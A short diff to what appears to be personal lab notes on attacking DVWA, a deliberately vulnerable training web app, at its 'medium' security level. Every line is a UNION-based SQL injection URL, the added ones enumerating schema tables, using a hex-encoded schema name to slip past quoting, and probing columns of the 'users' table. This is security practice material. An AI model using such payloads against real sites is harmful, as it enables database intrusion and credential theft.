@@ -5,3 +5,9 @@ security medium
 http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select 1,2%23&Submit=Submit#
 
 http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.tables%23&Submit=Submit#
+
+http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.tables where table_schema = 'dvwa' %23&Submit=Submit#
+
+http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.tables where table_schema = 0x64767761%23&Submit=Submit#
+
+http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.columns where table_name = 'users' %23&Submit=Submit#
